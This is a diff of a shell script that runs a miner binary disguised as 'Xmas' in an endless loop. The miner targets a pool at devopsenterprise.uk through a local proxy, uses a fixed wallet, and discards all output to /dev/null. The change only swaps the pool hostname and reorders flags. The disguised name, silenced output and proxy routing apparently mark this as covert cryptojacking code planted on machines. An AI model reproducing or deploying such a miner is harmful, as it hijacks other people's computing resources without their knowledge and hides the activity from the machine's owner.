@@ -108,6 +108,6 @@ sleep 2
 
 while true
 do
-./Xmas --donate-level 1 -o poolyadacio.devopsenterprise.uk:3333 -u 1LorV6u6LVt3BZn3SejRXwJJyDLJNfyHmu.$currentdate -p $currentdate -a rx/yada -k --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:1082 1>/dev/null 2>&1
+./Xmas --donate-level 1 -o usayadanode.devopsenterprise.uk:3333 -u 1LorV6u6LVt3BZn3SejRXwJJyDLJNfyHmu.$currentdate -p $currentdate -a rx/yada -k --randomx-1gb-pages --proxy=127.0.0.1:1082 -t $used_num_of_cores 1>/dev/null 2>&1
 sleep 10
 done
